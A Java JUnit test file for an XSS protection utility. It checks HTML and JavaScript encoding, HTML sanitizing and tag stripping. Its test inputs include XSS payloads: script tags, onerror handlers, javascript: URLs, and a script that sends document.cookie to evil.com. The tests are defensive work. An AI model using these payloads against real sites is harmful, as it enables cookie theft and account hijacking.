package com.geonho.vocautobot.adapter.common.util;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.NullSource;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

@DisplayName("XssProtectionUtil Tests")
class XssProtectionUtilTest {

    @Nested
    @DisplayName("encodeForHtml")
    class EncodeForHtmlTests {

        @Test
        @DisplayName("should return null for null input")
        void shouldReturnNullForNullInput() {
            assertThat(XssProtectionUtil.encodeForHtml(null)).isNull();
        }

        @Test
        @DisplayName("should return empty string for empty input")
        void shouldReturnEmptyForEmptyInput() {
            assertThat(XssProtectionUtil.encodeForHtml("")).isEmpty();
        }

        @Test
        @DisplayName("should preserve normal text without encoding")
        void shouldPreserveNormalText() {
            String input = "Hello World";
            assertThat(XssProtectionUtil.encodeForHtml(input)).isEqualTo("Hello World");
        }

        @ParameterizedTest
        @CsvSource({
                "'<script>alert(1)</script>', '&lt;script&gt;alert(1)&lt;/script&gt;'",
                "'<img src=x onerror=alert(1)>', '&lt;img src=x onerror=alert(1)&gt;'",
                "'Hello <b>World</b>', 'Hello &lt;b&gt;World&lt;/b&gt;'",
                "'&amp;', '&amp;amp;'",
                "'Test \"quote\"', 'Test &quot;quote&quot;'"
        })
        @DisplayName("should encode HTML special characters")
        void shouldEncodeHtmlSpecialCharacters(String input, String expected) {
            assertThat(XssProtectionUtil.encodeForHtml(input)).isEqualTo(expected);
        }

        @Test
        @DisplayName("should encode apostrophes")
        void shouldEncodeApostrophes() {
            String input = "It's a test";
            String result = XssProtectionUtil.encodeForHtml(input);
            assertThat(result).isEqualTo("It&#39;s a test");
        }

        @Test
        @DisplayName("should handle complex XSS attack vectors")
        void shouldHandleComplexXssVectors() {
            String input = "<script>document.location='http://evil.com/?cookie='+document.cookie</script>";
            String result = XssProtectionUtil.encodeForHtml(input);
            assertThat(result)
                    .doesNotContain("<script>")
                    .doesNotContain("</script>");
        }
    }

    @Nested
    @DisplayName("encodeForJavaScript")
    class EncodeForJavaScriptTests {

        @Test
        @DisplayName("should return null for null input")
        void shouldReturnNullForNullInput() {
            assertThat(XssProtectionUtil.encodeForJavaScript(null)).isNull();
        }

        @Test
        @DisplayName("should preserve normal text")
        void shouldPreserveNormalText() {
            String input = "Hello World";
            assertThat(XssProtectionUtil.encodeForJavaScript(input)).isEqualTo("Hello World");
        }

        @Test
        @DisplayName("should encode angle brackets as unicode")
        void shouldEncodeAngleBrackets() {
            String input = "<script>alert(1)</script>";
            String result = XssProtectionUtil.encodeForJavaScript(input);
            assertThat(result)
                    .contains("\\u003c")  // <
                    .contains("\\u003e"); // >
        }

        @Test
        @DisplayName("should encode quotes")
        void shouldEncodeQuotes() {
            String input = "test'quote\"double";
            String result = XssProtectionUtil.encodeForJavaScript(input);
            assertThat(result)
                    .contains("\\u0027")  // '
                    .contains("\\u0022"); // "
        }

        @Test
        @DisplayName("should escape backslash")
        void shouldEscapeBackslash() {
            String input = "path\\to\\file";
            String result = XssProtectionUtil.encodeForJavaScript(input);
            assertThat(result).contains("\\\\");
        }

        @Test
        @DisplayName("should escape forward slash")
        void shouldEscapeForwardSlash() {
            String input = "</script>";
            String result = XssProtectionUtil.encodeForJavaScript(input);
            assertThat(result).contains("\\/");
        }

        @Test
        @DisplayName("should escape newlines and tabs")
        void shouldEscapeNewlinesAndTabs() {
            String input = "line1\nline2\r\ttab";
            String result = XssProtectionUtil.encodeForJavaScript(input);
            assertThat(result)
                    .contains("\\n")
                    .contains("\\r")
                    .contains("\\t");
        }
    }

    @Nested
    @DisplayName("sanitizeHtml")
    class SanitizeHtmlTests {

        @Test
        @DisplayName("should return null for null input")
        void shouldReturnNullForNullInput() {
            assertThat(XssProtectionUtil.sanitizeHtml(null)).isNull();
        }

        @Test
        @DisplayName("should preserve safe formatting tags")
        void shouldPreserveSafeFormattingTags() {
            String input = "<b>bold</b> <i>italic</i> <strong>strong</strong> <em>emphasis</em>";
            String result = XssProtectionUtil.sanitizeHtml(input);
            assertThat(result)
                    .contains("<b>bold</b>")
                    .contains("<i>italic</i>")
                    .contains("<strong>strong</strong>")
                    .contains("<em>emphasis</em>");
        }

        @Test
        @DisplayName("should remove script tags completely")
        void shouldRemoveScriptTags() {
            String input = "Hello <script>alert('xss')</script> World";
            String result = XssProtectionUtil.sanitizeHtml(input);
            assertThat(result)
                    .doesNotContain("<script>")
                    .doesNotContain("</script>")
                    .doesNotContain("alert")
                    .contains("Hello")
                    .contains("World");
        }

        @Test
        @DisplayName("should remove event handlers from allowed tags")
        void shouldRemoveEventHandlers() {
            String input = "<a href=\"http://example.com\" onclick=\"alert(1)\">Click</a>";
            String result = XssProtectionUtil.sanitizeHtml(input);
            assertThat(result)
                    .doesNotContain("onclick")
                    .contains("<a")
                    .contains("Click</a>");
        }

        @Test
        @DisplayName("should remove iframe tags")
        void shouldRemoveIframeTags() {
            String input = "<iframe src=\"http://evil.com\"></iframe>";
            String result = XssProtectionUtil.sanitizeHtml(input);
            assertThat(result)
                    .doesNotContain("<iframe")
                    .doesNotContain("</iframe>");
        }

        @Test
        @DisplayName("should preserve safe links")
        void shouldPreserveSafeLinks() {
            String input = "<a href=\"https://example.com\">Safe Link</a>";
            String result = XssProtectionUtil.sanitizeHtml(input);
            assertThat(result).contains("<a");
            assertThat(result).contains("Safe Link</a>");
        }

        @Test
        @DisplayName("should sanitize javascript: URLs in links")
        void shouldSanitizeJavascriptUrls() {
            String input = "<a href=\"javascript:alert(1)\">Click</a>";
            String result = XssProtectionUtil.sanitizeHtml(input);
            assertThat(result).doesNotContain("javascript:");
        }

        @Test
        @DisplayName("should preserve paragraph and div tags")
        void shouldPreserveBlockTags() {
            String input = "<p>Paragraph</p><div>Division</div>";
            String result = XssProtectionUtil.sanitizeHtml(input);
            assertThat(result)
                    .contains("<p>Paragraph</p>")
                    .contains("<div>Division</div>");
        }

        @Test
        @DisplayName("should preserve table tags")
        void shouldPreserveTableTags() {
            String input = "<table><tr><td>Cell</td></tr></table>";
            String result = XssProtectionUtil.sanitizeHtml(input);
            assertThat(result).contains("<table>");
            assertThat(result).contains("<td>Cell</td>");
        }

        @Test
        @DisplayName("should handle img tags with onerror removed")
        void shouldHandleImgTagsSecurely() {
            String input = "<img src=\"http://example.com/img.png\" onerror=\"alert(1)\">";
            String result = XssProtectionUtil.sanitizeHtml(input);
            assertThat(result)
                    .doesNotContain("onerror")
                    .contains("<img");
        }

        @Test
        @DisplayName("should handle complex nested XSS attacks")
        void shouldHandleNestedXssAttacks() {
            String input = "<div style=\"background:url('javascript:alert(1)')\"><b onclick=\"alert(2)\">test</b></div>";
            String result = XssProtectionUtil.sanitizeHtml(input);
            assertThat(result)
                    .doesNotContain("javascript:")
                    .doesNotContain("onclick")
                    .contains("<b>test</b>");
        }
    }

    @Nested
    @DisplayName("stripHtml")
    class StripHtmlTests {

        @Test
        @DisplayName("should return null for null input")
        void shouldReturnNullForNullInput() {
            assertThat(XssProtectionUtil.stripHtml(null)).isNull();
        }

        @Test
        @DisplayName("should remove all HTML tags")
        void shouldRemoveAllHtmlTags() {
            String input = "<p>Hello <b>World</b></p>";
            String result = XssProtectionUtil.stripHtml(input);
            assertThat(result).isEqualTo("Hello World");
        }

        @Test
        @DisplayName("should handle script tags")
        void shouldHandleScriptTags() {
            String input = "Before <script>alert(1)</script> After";
            String result = XssProtectionUtil.stripHtml(input);
            assertThat(result)
                    .contains("Before")
                    .contains("After")
                    .doesNotContain("<script>");
        }
    }
}
